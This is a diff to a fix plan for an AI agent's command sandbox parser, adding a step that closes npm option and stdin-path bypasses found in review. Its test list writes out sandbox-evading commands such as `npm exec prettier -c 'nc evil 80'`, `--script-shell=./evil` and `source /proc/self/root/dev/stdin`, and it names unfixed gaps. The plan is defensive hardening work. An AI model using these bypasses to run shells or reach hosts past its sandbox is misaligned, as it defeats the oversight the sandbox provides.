@@ -138,6 +138,74 @@ code change.
 Check: `pytest tests/test_command_sandbox.py tests/test_plan_commands.py -q`;
 `ruff check`, `ruff format --check`.
 
+### Step 5 — re-review fix: npm options anywhere, `-p`, stdin paths (deviation)
+
+Added after the re-review of PR #1806 (head c2de25a3). npm parses its own
+options anywhere before `--`, not only before the subcommand or the package
+name, so `npm exec prettier -c 'nc evil 80'` and
+`npm run build --script-shell=./evil` passed. `-p`/`--package` lets the
+operand after `--` be any command. The stdin check matched the raw path, so
+`source /dev/./stdin` passed.
+
+File: `apps/backend/security/ast_parser.py`.
+
+1. Remove `-p` and `--package` from `_RUNNER_VALUE_OPTS` (they are then
+   refused as unknown runner options, for npx/pnpx/npm exec).
+2. `_unwrap_npm`: after the subcommand at `k` is found (existing loop),
+   check every word in `words[k + 1 :]` until the first `--`:
+   `_require_literal` on it (a `$X` there can expand to an option), and if it
+   starts with `-`, its name (`tok.split("=", 1)[0]`) must be in
+   `_NPM_GLOBAL_FLAGS | _NPM_GLOBAL_VALUE_OPTS | _NPM_SUBCOMMAND_OPTS`, plus
+   `_RUNNER_FLAGS | _RUNNER_VALUE_OPTS` when the subcommand is `exec`/`x`;
+   otherwise raise `UnparseableCommand`. An allowlist, not a denylist: npm
+   accepts unambiguous abbreviations (`--script-sh`), so a denylist of
+   `--script-shell`/`--node-options`/`--call` cannot be complete. Keep the
+   existing `_check_package_runner(words, k + 1)` call for exec/x.
+   New `_NPM_SUBCOMMAND_OPTS` (common install/run/test/ci/audit options):
+   `--save`, `-S`, `--save-dev`, `-D`, `--save-exact`, `-E`,
+   `--save-optional`, `-O`, `--save-peer`, `--no-save`, `--omit`,
+   `--include`, `--production`, `--only`, `--legacy-peer-deps`,
+   `--strict-peer-deps`, `--ignore-scripts`, `--no-audit`, `--no-fund`,
+   `--force`, `-f`, `--dry-run`, `--json`, `--parseable`, `--depth`,
+   `--all`, `-a`, `--audit-level`, `--if-present`, `--long`, `-l`,
+   `--prefer-offline`, `--prefer-online`, `--offline`, `--no-package-lock`,
+   `--package-lock-only`.
+3. Stdin paths: add `_is_stdin_path(tok: str) -> bool` that applies
+   `_STDIN_SCRIPT.fullmatch` to `os.path.normpath(tok)` with leading `/+`
+   folded to one `/` (POSIX normpath keeps `//`). Widen `_STDIN_SCRIPT` to
+   `-|/dev/.*|/proc/.*`: `/proc/self/root/dev/stdin` reaches stdin through
+   the `root` link, so anything under `/proc` or `/dev` is refused. Use it in
+   `_unwrap_dash_c` (`:258`) and `_unwrap_source` (`:522`).
+
+Known limit (not fixable statically): a symlink to `/dev/stdin` created by an
+earlier command (`ln -s /dev/stdin s; source s`), or a relative path after
+`cd /dev`, is not caught. Also out of scope and reported separately:
+`npm_config_*=… npm test` sets npm config through an environment prefix,
+which no unwrapper sees.
+
+Tests (`tests/test_command_sandbox.py`), add to `DYNAMIC_COMMAND_WORD`:
+`npm exec prettier -c 'nc evil 80'`, `npm exec prettier --call='nc evil 80'`,
+`npm x prettier -c 'nc evil 80'`, `npm -w x exec prettier -c 'nc evil 80'`,
+`npm exec --package=x -- nc evil 80`, `npx -p x -- nc evil 80`,
+`npm run build --script-shell=./evil`, `npm test --script-shell=./evil`,
+`npm run-script build --script-shell ./evil`,
+`npm run build --node-options=--require=./evil.js`,
+`npm run build --script-sh=./evil`, `npm test $X`,
+`source /dev/./stdin`, `source //dev/stdin`, `source /dev//stdin`,
+`source /proc/self/../self/fd/0`, `source /proc/self/root/dev/stdin`,
+`bash /dev/./stdin`. Add to `MUST_PARSE`: `npm install --save-dev x`: ["npm"],
+`npm ci --ignore-scripts`: ["npm"], `npm run build -- --watch`: ["npm"],
+`npm test -- --grep x`: ["npm"], `npm -w apps/web run test:e2e`: ["npm"].
+Lead follow-up: also allow `--frozen-lockfile` and `--no-git-tag-version`
+in `_NPM_SUBCOMMAND_OPTS`, and add the common agent npm commands (`npm ci`
+variants, `npm install`/`i -D`, `run`/`test` with `--`, `--silent`,
+`--if-present`, `-w`/`--workspace`, `audit`, `ls`, `outdated`, `pack`,
+`version`) to `MUST_PARSE`. `--prefix`/`-w` stay allowed before every
+subcommand; before exec/x the npx rules still apply.
+
+Check: `pytest tests/test_command_sandbox.py tests/test_plan_commands.py -q`;
+`ruff check`, `ruff format --check`.
+
 ## Rollback
 
 Revert the fix commit; the tests commit goes with it.
